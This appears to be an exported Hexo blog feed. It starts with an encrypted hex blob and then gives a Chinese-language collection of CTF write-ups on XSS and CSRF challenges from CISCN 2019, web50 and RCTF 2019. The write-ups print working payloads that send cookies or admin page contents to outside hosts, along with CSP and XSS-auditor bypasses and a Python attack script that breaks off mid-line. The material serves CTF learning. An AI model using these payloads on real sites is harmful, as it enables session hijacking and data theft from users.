ea36d9b1d21d5db86b9ca511f2834fb821ee71013857c5700f1ae6c200a1d94f88fb1dcc02edb07b398f16bbe2834e52f206c128847de68c8e886d883cd123b5357889a277e3e65445363509542493189736118b1b3fab9c090909c6a1aa03298f7413b9b9f849a6ee740af3a73759316e4e554962232c086f338e6f903bfe40771d351e7d4af3519c5059e5b2a6a3a4ef53a5971fb3c7d344c50d78db20d25ea20f50ad9cb2e7334f742b11882d33e3113c1d0e219377d1502029e9b1cd77855beb2bd95a8c087b91890b98db8605ebda4baa3c81c66429fbeca335035d0f1678459eb80421adb92119fc2126d7fb4dfdeb7c5d6b4a841676c06d65c20d22e44e092c74a6e3af5e56be9a455c6877a3470640629890c935ab3b993b3fde9e094df8831f3c9a1c1ff27ef83bf2ce824a749a8ab57cd3e1ed396b67185ec1fcbe3949a912bc6ff27ef481bf941c41462f931282b92b4d23a7f919d8c0c10ad4e8653e9d967586cd2823c0657bd2694aafe2fc140ffc2417a70d19127ff6404e743d3a6eb965c25dc99ddd95bf6efd940202883296b567c208278a5f1fc5060212efb689aed536e63e1795b0b99589e60e33d0065c08f6ec23f98596be8ed7e80f46fb63fe6f83fe0a098ecc458bcccba70473961d484d6d9fc11a957f9c128318d1d32ebe74609d4e2e95203f17ea8a8e83d119af7caadb220193f8316a0971412e525d7920a3cb38f2daa6819c1649e5e8c1f27ed664e593385152a7e3b457f4df407730187b9ad1002bd32fb537252fd949c2a212208d4b51ed62b3b80d64e45f196a118d9cd22e198bd998e587bda74026660d329d1a1b7930db656f1ec7064c438bc48e42e507019a7f484ede3fd36777873b30a7d9406975ab17a7ed25ae121d715c25e7a7f01b96eb1943cf3d2d594c0c92c96894aa9e097f176b3982bead8e71c379e5c2bb15668f0bb89ac640aae3e0cbbf40686ed81ad873296f6aeb0ae0fad5d88b666be4589c2297cd4e0d118b8dba5292749aad800df290c4955a631c84672edad4f496af5b817dba448c5294670336f791514e3750171f45741379314adae5b4ac568f6e1eaadfc02268208f6cf88737519193950391cd80978cb91f3c65977dc05ae902791aa9e05b03fa371e35f94db1c20e7c76479c136c8947787fd1e945d1ac2b75fc679722ce21c69f39296eecca2b44c91c7ce6a38f0040827616153ce0869f956886bbd1bb4f38eac92b51535363a77d9e7ce4bc75e9aae52bdbc72d9abfa4930d93d7fa2f19ab9fde7244e6b23685aaa5ada2516abbb29fcb6c1cd4a6cca67094df184ac14fba87c02d291a51e3dec88ba528471c0dbab01b633b23a1574a755e62209e001ab3be0c772e2a0220ae2e75fcdf7daafa9929382a91e3cad73a464948d89a131e1e87ac56e83c98871fba3bf1c2d66a01a62ac623268bb7d71bb38f906ca1349df622e0ca12f63f14f5f7090c680f90a75ce39b68fae70ad7852a6faba9e529a4dd31050381e8b01327f9cb119dbde0088a7be87d0ad62220b88582ad72c0e578f2b92e49e7d2b1023abc5fc46ac86b99af4afb7e5d89097f937dba031563ac786f8a86604418208ea326449e613dbae70d5d9f320a0037a3fb54294b86c8f14e653e0320a5510ee8142b252b708d37ed73fb82e9fa49f137c5fa37876ebafb31348c11e51d32bf7f78675638e78b03074ace7d6de7bd148d3488d9ae5ddc215f2ea0538c909b22f5c49f06df77f031d6033c96e4e3e2c08fbfdce88ef3a29e3349128ebeecc762af5d0fef46058d120852828dea2b0f8a941e83ce536a27389d2cec166694333af5c3cf747fe85757f08064923aaaeadf3d3b2056</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>XSS &amp; CSRF 题型记录[working forever]</title>
    <url>/2019/04/22/XSS%E9%A2%98%E5%9E%8B%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h2 id="CISCN-2019-华东北赛区-web2">CISCN 2019 华东北赛区 web2</h2>
<p>注册登录， 有投稿和反馈功能， 投个稿试试</p>
<p><img src="https://user-images.githubusercontent.com/40637063/70881416-7485b100-2007-11ea-899f-9336636cfc90.png" alt="image"></p>
<p>投完可以看自己的稿件， 发现没有触发， 看看什么情况</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;content-security-policy&quot; content=&quot;default-src &apos;self&apos;; script-src &apos;unsafe-inline&apos; &apos;unsafe-eval&apos;&quot;&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;script&gt;alert（1）&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>嗯, 括号被转成中文的括号了.</p>
<p><strong>使用svg特性(xml自动解析html实体编码)搭配html实体编码来绕过waf</strong></p>
<p><img src="https://user-images.githubusercontent.com/40637063/70881794-aa776500-2008-11ea-8e5c-4b4c7f301b83.png" alt="image"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/70883020-a6e5dd00-200c-11ea-8ca6-c711d5728c96.png" alt="image-20191216133320204"></p>
<p>然后来到反馈页面， 将这个html页面的url反馈给管理员</p>
<p><img src="https://user-images.githubusercontent.com/40637063/70883084-d4cb2180-200c-11ea-97d2-df4c7d45b503.png" alt="image-20191216133436010"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10000001</span>):</span><br><span class="line">    s = hashlib.md5(str(i)).hexdigest()[<span class="number">0</span>:<span class="number">6</span>]</span><br><span class="line">    <span class="keyword">if</span> s == <span class="string">"b64628"</span>:</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>然后就可以获得cookie, 之后扫描或者猜测可以发现<strong>admin.php</strong> , 带着cookie去访问, 是一个用户查询, 简单的sql注入而已, 就不说了.</p>
<h2 id="web50">web50</h2>
<p>首先我们进入页面，里面有两个文本框，查看源码可以得知这是注册登陆框。我们随便注册一个。<br>
然后有两个选项<code>profile</code>和<code>report bug</code>，前者记录了我们的账户信息。</p>
<p>后者包含了一个文本框，提交一些东西之后显示<code>admin will take a look, blah blah, you know what it means</code>，可以推测我们<code>上传的东西都会被管理员查看</code>，那么存在<code>client-attack</code>，最有可能是xss攻击了。</p>
<p>然后在几个地方尝试XSS注入，发现上传的文件中可以传入xss脚本，并且可以执行，验证脚本如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">-----------------------------18467633426500</span><br><span class="line">Content-Disposition: form-data; name="avatar"; filename="fu.svg"</span><br><span class="line">Content-Type: image/svg+xml</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span> <span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">width</span>=<span class="string">"100px"</span> <span class="attr">height</span>=<span class="string">"100px"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">      alert(<span class="string">'XSS!'</span>);</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line">-----------------------------18467633426500--</span><br></pre></td></tr></table></figure>
<p>在发送之后。我们要把上传文件的<code>url</code>通过<code>report bug</code>上传给管理员。<br>
注意<code>content-type后面需要空一行，content-type的类型也要声明成image/svg+xml</code>，通过访问回显出来的图片url可以发现执行成功。</p>
<p>下一步尝试将拿admin的<code>cookie</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">-----------------------------18467633426500</span><br><span class="line">Content-Disposition: form-data; name="avatar"; filename="fu.svg"</span><br><span class="line">Content-Type: image/svg+xml</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span> <span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">width</span>=<span class="string">"100px"</span> <span class="attr">height</span>=<span class="string">"100px"</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">window</span>.open(<span class="string">"http://207.148.64.125:1234/?$&#123;document.cookie&#125;"</span>)</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line">-----------------------------18467633426500--</span><br></pre></td></tr></table></figure>
<p>然后服务器上开nc服务监听。但是并没有东西回显，很有可能是因为<code>httponly</code>的缘故。<code>在httponly下，js是无法操作cookie的</code>。</p>
<p>但是还有一个方法，管理员在访问我们上传的东西的时候，我们的脚本可以让他去访问他自己的profile，而且在访问的时候肯定是携带自己的cookie的，那么我们可以在脚本中将他访问之后得到的内容直接发送到我们自己的服务器上，这样绕过了cookie安全策略.(<code>原本常规做法是先获取cookie然后亲自去访问profile的,但是这次我们直接让admin自己去访问profile,省却了获取cookie的环节, cookie是被借用而不是被盗取, 这就是csrf的大致想法</code>)</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span> <span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">width</span>=<span class="string">"100px"</span> <span class="attr">height</span>=<span class="string">"100px"</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">      xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (xhr.readyState === <span class="number">4</span>) &#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">var</span> xhr2 = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">          xhr2.open(<span class="string">"POST"</span>, <span class="string">"http://url:port/"</span>);</span></span><br><span class="line">          xhr2.send(xhr.responseText);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;   </span><br><span class="line"><span class="javascript">      xhr.open(<span class="string">"GET"</span>, <span class="string">"http://web50.zajebistyc.tf/profile/admin"</span>);</span></span><br><span class="line"><span class="javascript">      xhr.withCredentials = <span class="literal">true</span>;</span></span><br><span class="line">      xhr.send();</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里的<code>url:port</code>推荐使用<code>burpsuite</code>的<code>burpcollaborator</code>，但是我的炸了，所以选择使用自己的服务器，使用<code>nc -lvvkp 1234</code>来监听信息。如果一次不行可以再重来一下，我试了两次就出来了flag。</p>
<p><img src="https://user-images.githubusercontent.com/40637063/70883205-2c698d00-200d-11ea-9861-f5556e015024.png" alt="image"></p>
<blockquote>
<p>关于这道题目的一点思考:</p>
<p>经过搜索, 我发现XMLHttprequest默认情况下允许向不同源发送请求, 但是同源策略会阻止读取响应内容, 这似乎并不重要, 重要的是我们的请求是否可以将我们想要发送的httponly-cookie发送出去, 在web前端黑客技术揭秘这本书中,提到了,如果要带上会话信息来发送请求, 就要设置withCredentials的值为true.</p>
<p>设置HttpOnly属性，Cookie盗窃的威胁并没有彻底消除，因为cookie还是有可能传递的过程中被监听捕获后信息泄漏, 在这道题中就是这样.</p>
</blockquote>
<h2 id="eXquisite-Scenery-Sites-boot2root">eXquisite Scenery Sites(boot2root)</h2>
<p>这是一道xss题目，注入点在<code>username</code>上面，有长度限制<code>80</code>字符，过滤关键字：<code>scipt</code>和<code>.</code>，<code>script</code>大小写绕过，原来的<code>document.cookie</code>改写成<code>document['cookie']</code>，<br>
将<code>ip地址转化为长整数类型</code>，省略http来节省长度空间。最终payload如下。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">user=1&amp;Message=&lt;scriPt&gt;document[&apos;location&apos;]=&apos;//3482599549:8/?&apos;%2bdocument[&apos;cookie&apos;];&lt;/sCript&gt;</span><br></pre></td></tr></table></figure>
<h2 id="Rctf-rblog">Rctf rblog</h2>
<p>点击查看网页源代码，发现<code>rblog.js</code> ，进入看看，里面提供了一个<code>/api/v2/posts</code> 。</p>
<p>访问之后把<code>posts</code> 换成其他的东西，发现<code>v2/</code>后面的内容会以字符串形式呈现，并在字符串的开头加上了斜杆。尝试http://rblog.2019.rctf.rois.io/api/v2/aaaaa<img>  或者是其他的标签来验证是否存在反射性XSS，但是并没有解析 ，在<code>header</code> 部分如下：</p>
<p><img src="https://user-images.githubusercontent.com/40637063/58318343-24b48200-7e4a-11e9-9bed-625dfb6ef869.png" alt="image"></p>
<p>返回的数据依旧是<code>application/json</code> 说明图片标签并没有被解析。</p>
<p>然后需要一点脑洞，或者搜索能力，<code>v2</code> 是版本号，那么换成<code>v1</code> 访问试一试。同样测试是否存在反射XSS 漏洞 ： <a href="https://rblog.2019.rctf.rois.io/api/v1/" target="_blank" rel="noopener">https://rblog.2019.rctf.rois.io/api/v1/</a><img>，这次返回如下</p>
<p><img src="https://user-images.githubusercontent.com/40637063/58318897-46facf80-7e4b-11e9-9702-87e89cf4afbe.png" alt="image"></p>
<p>看，<code>&lt;img&gt;</code> 作为<code>html</code> 标签解析了，但是还有<code>csp</code> 需要绕过</p>
<p><code>Content-Security-Policy: default-src 'self'; object-src 'none'</code></p>
<p>然后看题目给的提示：</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; API supports JSONP.</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>关于<code>JSONP</code> 和<code>callback</code> ，我看到了一段话，有助于理解：</p>
<blockquote>
<p>客户端把回调函数的名字传送给服务端，<br>
然后服务端生成一段js代码且代码中包含着对回调函数的调用，<br>
然后服务端把这段代码返回给客户端，<br>
然后客户端执行这段代码的过程中调用了回调函数，<br>
然后你就可以在回调函数里面处理数据了</p>
</blockquote>
<p>结合下面几个链接应该就可以弄懂了。</p>
<p><a href="https://www.zhihu.com/question/20235590" target="_blank" rel="noopener">https://www.zhihu.com/question/20235590</a></p>
<p><a href="http://www.cnblogs.com/dowinning/archive/2012/04/19/json-jsonp-jquery.html" target="_blank" rel="noopener">http://www.cnblogs.com/dowinning/archive/2012/04/19/json-jsonp-jquery.html</a></p>
<p><a href="https://juejin.im/entry/59f2f4ec518825411570156c" target="_blank" rel="noopener">https://juejin.im/entry/59f2f4ec518825411570156c</a></p>
<p>测试一下<code>https://rblog.2019.rctf.rois.io/api/v1/posts?callback=test</code>，返回：</p>
<p><img src="https://user-images.githubusercontent.com/40637063/58321041-9c38e000-7e4f-11e9-805d-b0620180836c.png" alt="image"></p>
<p><code>callback</code> 后面的参数会包裹网页内容并呈现在网页上，那么就可以用反射型的XSS。</p>
<figure class="highlight plain"><figcaption><span>src</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">![image](https://user-images.githubusercontent.com/40637063/58321250-3b5dd780-7e50-11e9-8fc2-fa4ff8d9a4ee.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">可以看到斜杆被转义了。。。把``script``部分换成其他符号测试一下，发现``,`` ``&quot;`` ``/``也被转义了，选择``html``编码可以绕过。</span><br><span class="line"></span><br><span class="line">```&lt;iframe srcdoc=&amp;#60;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#32;&amp;#115;&amp;#114;&amp;#99;&amp;#61;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#115;&amp;#58;&amp;#47;&amp;#47;&amp;#114;&amp;#98;&amp;#108;&amp;#111;&amp;#103;&amp;#46;&amp;#50;&amp;#48;&amp;#49;&amp;#57;&amp;#46;&amp;#114;&amp;#99;&amp;#116;&amp;#102;&amp;#46;&amp;#114;&amp;#111;&amp;#105;&amp;#115;&amp;#46;&amp;#105;&amp;#111;&amp;#47;&amp;#97;&amp;#112;&amp;#105;&amp;#47;&amp;#118;&amp;#49;&amp;#47;&amp;#112;&amp;#111;&amp;#115;&amp;#116;&amp;#115;&amp;#63;&amp;#99;&amp;#97;&amp;#108;&amp;#108;&amp;#98;&amp;#97;&amp;#99;&amp;#107;&amp;#61;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&amp;#59;&amp;#99;&amp;#111;&amp;#110;&amp;#115;&amp;#111;&amp;#108;&amp;#101;&amp;#46;&amp;#108;&amp;#111;&amp;#103;&amp;#62;&amp;#60;&amp;#47;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#62;&gt;</span><br></pre></td></tr></table></figure>
<p>内容是：</p>
<figure class="highlight plain"><figcaption><span>srcdoc</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">相当于把``alert(1);console.lot(XXXXXXXXXXX)`` 呈现在页面上之后把他们当做script脚本执行。当然，传入之前要先进行url编码，毕竟井号会被视为锚点。</span><br><span class="line"></span><br><span class="line">![image](https://user-images.githubusercontent.com/40637063/58365573-0063ae80-7ef9-11e9-94e9-7e1f6df04af7.png)</span><br><span class="line"></span><br><span class="line">在``firefox``行得通，但是在``chrome``下面会被拦截。</span><br><span class="line"></span><br><span class="line">关于``XSS-Auditor`` 我找到以下一段话：</span><br><span class="line"></span><br><span class="line">&gt; XSS Auditor takes a black list approach to identify dangerous characters and tags supplied in request parameters. It also attempts to match query parameters with content to identify injection points. If the query parameter can’t be matched to content in the response, the auditor will not be triggered. Because the browser will never have insight to server-side code, an application that mangles an XSS payload will always render the XSS auditor useless in preventing attacks.</span><br><span class="line"></span><br><span class="line">也就是说，如果后端对我们输入的url进行了某种处理的话，就可以导致url部分和页面内容部分不一致，从而构成对``XSS-auditor`` 的绕过。</span><br><span class="line"></span><br><span class="line">那么进行一波fuzz。发现中文符号（比如``￥`` ``·`` ``。`` ``，`` ）都会被转成类似于如下的形式</span><br><span class="line"></span><br><span class="line">![image](https://user-images.githubusercontent.com/40637063/58365956-1031c180-7efe-11e9-95a2-ed16f8970795.png)</span><br><span class="line"></span><br><span class="line">那么最后的payload就是：</span><br><span class="line"></span><br><span class="line">```https://rblog.2019.rctf.rois.io/api/v1/%3Ciframe%20srcdoc=(很多个中文句号span><br></pre></td></tr></table></figure>
<p>其中的内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;https://rblog.2019.rctf.rois.io/api/v1/posts?callback=parent.location.href=&apos;http://xss.f1sh.site/?&apos;%2bdocument.cookie;console.log&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>将这部分进行html实体编码之后包裹进<code>&lt;iframe srcdoc=(很多中文句号){放置位置}&gt;</code>，然后进行整体url编码之后传入，就得到了flag。</p>
<h2 id="RCTF2019-jails-password">RCTF2019 jails &amp;password</h2>
<p><a href="https://xz.aliyun.com/t/5216" target="_blank" rel="noopener">https://xz.aliyun.com/t/5216</a></p>
<p><a href="https://github.com/nytr0gen/rctf-2019-writeups#jail" target="_blank" rel="noopener">https://github.com/nytr0gen/rctf-2019-writeups#jail</a></p>
<p><a href="https://github.com/liuhack/writeups/blob/master/2019/RCTF/jail/Readme.md" target="_blank" rel="noopener">https://github.com/liuhack/writeups/blob/master/2019/RCTF/jail/Readme.md</a></p>
<p><a href="https://github.com/zsxsoft/my-ctf-challenges/tree/master/rctf2019/jail%20%26%20password" target="_blank" rel="noopener">https://github.com/zsxsoft/my-ctf-challenges/tree/master/rctf2019/jail %26 password</a></p>
<p>Unexpected Solution</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash</span><span class="params">(s, cipher)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> cipher == <span class="string">'sha1'</span>:</span><br><span class="line">        <span class="keyword">return</span> hashlib.sha1(s).hexdigest()</span><br><span class="line">    <span class="keyword">elif</span> cipher == <span class="string">'sha224'</span>:</span><br><span class="line">        <span class="keyword">return</span> hashlib.sha224(s).hexdigest()</span><br><span class="line">    <span class="keyword">elif</span> cipher == <span class="string">'sha256'</span>:</span><br><span class="line">        <span class="keyword">return</span> hashlib.sha256(s).hexdigest()</span><br><span class="line">    <span class="keyword">elif</span> cipher == <span class="string">'sha384'</span>:</span><br><span class="line">        <span class="keyword">return</span> hashlib.sha384(s).hexdigest()</span><br><span class="line">    <span class="keyword">elif</span> cipher == <span class="string">'sha512'</span>:</span><br><span class="line">       <span class="keyword">return</span> hashlib.sha512(s).hexdigest()</span><br><span class="line">    <span class="keyword">elif</span> cipher == <span class="string">'md5'</span>:</span><br><span class="line">        <span class="keyword">return</span> hashlib.md5(s).hexdigest()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">'cipher not found %s'</span> % cipher)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"></span><br><span class="line">hashes = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  return the breaking value </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">break_hash</span><span class="params">(cipher, key)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> hashes</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> hashes <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        exists = os.path.isfile(<span class="string">'hashes.marshal'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> exists:</span><br><span class="line">            hashes = &#123;&#125;</span><br><span class="line">            <span class="comment">#  generate a hash dictionary</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="number">10000000</span>):<span class="comment">#256**4):</span></span><br><span class="line">                s = str(i)</span><br><span class="line">                h = hash(s, cipher)</span><br><span class="line">                hashes[ h[<span class="number">0</span>:<span class="number">6</span>] ] = s</span><br><span class="line"></span><br><span class="line">                <span class="comment">#  0x0FFFFFFF</span></span><br><span class="line">                <span class="comment">#  print every 1048575 times</span></span><br><span class="line">                <span class="keyword">if</span> (i &amp; <span class="number">1048575</span>) == <span class="number">1048575</span>:</span><br><span class="line">                    print(<span class="string">'[*] hash loading at %s'</span> % s)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#  write it into file</span></span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">'hashes.marshal'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                marshal.dump(hashes, f)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'[*] loading lots of hashes'</span>)</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">'hashes.marshal'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                hashes = marshal.load(f)</span><br><span class="line">            print(<span class="string">'[*] done loading'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">not</span> <span class="keyword">in</span> hashes:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">'matching hash not found'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> hashes[key]</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">req = <span class="literal">None</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span><span class="params">(i=<span class="number">0</span>, j=<span class="number">0</span>, tries=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> req</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> <span class="number">1</span> &lt;= j &lt; <span class="number">8</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="number">0</span> &lt;= i</span><br><span class="line">    <span class="keyword">assert</span> <span class="number">0</span> &lt;= tries &lt;= <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    cookies = &#123;<span class="string">"PHPSESSID"</span>: <span class="string">"a44a15e070b2d3c4adf9e951de241af3"</span>&#125;</span><br><span class="line">    <span class="keyword">if</span> req <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="comment"># os.environ["HTTP_PROXY"] = "http://localhost:8080"</span></span><br><span class="line">        <span class="comment"># os.environ["HTTPS_PROXY"] = "http://localhost:8080"</span></span><br><span class="line"></span><br><span class="line">        req = requests.Session()</span><br><span class="line">        req.cookies.update(cookies)</span><br><span class="line">        req.verify = <span class="literal">False</span></span><br><span class="line">        req.allow_redirects = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    word = <span class="string">'retrying'</span> <span class="keyword">if</span> tries &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="string">'trying'</span></span><br><span class="line">    print(<span class="string">'[*] %s for i=%d j=%d'</span> % (word, i, j))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#  what is 0x%08x ?</span></span><br><span class="line">    payload = <span class="string">"""</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">i=0x%08x;</span></span><br><span class="line"><span class="string">j=0x%02x;</span></span><br><span class="line"><span class="string">v = document.cookie;</span></span><br><span class="line"><span class="string">s = v.charCodeAt(i).toString(2).padStart(8, '0')[j];</span></span><br><span class="line"><span class="string">document.cookie="PHPSESSID=%s";</span></span><br><span class="line"><span class="string">window.onload = function() &#123;</span></span><br><span class="line"><span class="string">method = null;</span></span><br><span class="line"><span class="string">if (s === '1') &#123;</span></span><br><span class="line"><span class="string">    method = 'delete';</span></span><br><span class="line"><span class="string">&#125; else if(s === '0') &#123;</span></span><br><span class="line"><span class="string">    method = 'logout';</span></span><br><span class="line"><span class="string">&#125; else &#123;</span></span><br><span class="line"><span class="string">    method = 'bad';</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">document.write('&lt;img src="https://jail.2019.rctf.rois.io/?action=index&amp;method=' + method + '"&gt;');</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">"""</span> % (i, j, cookies[<span class="string">'PHPSESSID'</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># submit post with payload</span></span><br><span class="line">    url = <span class="string">'https://jail.2019.rctf.rois.io/'</span></span><br><span class="line">    resp = req.post(url, data=&#123;<span class="string">"message"</span>: payload&#125;,  allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># login if not logged</span></span><br><span class="line">    <span class="keyword">if</span> resp.status_code == <span class="number">302</span>:</span><br><span class="line">        url = <span class="string">'https://jail.2019.rctf.rois.io/?action=login'</span></span><br><span class="line">        data = &#123;<span class="string">"username"</span>: <span class="string">"leethacker"</span>, <span class="string">"password"</span>: <span class="string">"leethacker"</span>&#125;</span><br><span class="line">        resp = req.post(url, data=data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># resend payload</span></span><br><span class="line">        url = <span class="string">'https://jail.2019.rctf.rois.io/'</span></span><br><span class="line">        resp = req.post(url, data=&#123;<span class="string">"message"</span>: payload&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get post id</span></span><br><span class="line">    post_id = resp.text.split(<span class="string">'/?action=post&amp;id='</span>)[<span class="number">1</span>].split(<span class="string">'" target="'</span>)[<span class="number">0</span>].encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    print(<span class="string">"[*] post_id: %s"</span> % post_id)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># go to feedback page</span></span><br><span class="line">    url = <span class="string">'https://jail.2019.rctf.rois.io/?action=feedback'</span></span><br><span class="line">    resp = req.get(url)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get proof of work</span></span><br><span class="line">    pow = resp.text.split(<span class="string">'Captcha: substr(md5(captcha), 0, 6) == "'</span>)[<span class="number">1</span>].split(<span class="string">'"&lt;/label&gt;'</span>)[<span class="number">0</span>].encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    print(<span class="string">"[*] captcha: %s"</span> % pow)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># submit post id</span></span><br><span class="line">        <span class="comment"># id=0&amp;captcha=1780076&amp;test=1</span></span><br><span class="line">        url = <span class="string">'https://jail.2019.rctf.rois.io/?action=feedback'</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'id'</span>: post_id,</span><br><span class="line">            <span class="string">'captcha'</span>: break_hash(<span class="string">'md5'</span>, pow),</span><br><span class="line">            <span class="string">'test'</span>: <span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        resp = req.post(url, data=data)</span><br><span class="line">        print(<span class="string">'[*] sent post to feedback'</span>)</span><br><span class="line">        <span class="keyword">if</span> resp.text.find(<span class="string">'Admin will view your 